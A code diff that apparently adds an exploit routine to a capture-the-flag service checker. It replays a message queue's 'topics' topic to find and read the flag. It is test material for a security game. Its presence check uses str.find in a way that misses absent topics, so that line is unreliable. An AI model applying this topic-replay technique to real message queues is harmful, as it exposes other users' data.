@@ -164,6 +164,17 @@ class MessageQueueChecker(BaseChecker):
     def havoc(self):
         topics = self.must_list_topics()
 
+    def exploit(self):
+        desired_topic = generate_topic(self.flag)
+        exploitable_topic = "topics"
+        all_topics = self.must_replay(exploitable_topic)
+        if not all_topics.find(desired_topic):
+            raise BrokenServiceException(
+                f'Topic "{desired_topic}" missing from replay of topic "{exploitable_topic}"'
+            )
+        self.must_get_message(desired_topic, self.flag)
+        self.debug("Service exploited")
+
 
 app = MessageQueueChecker.service
 if __name__ == "__main__":
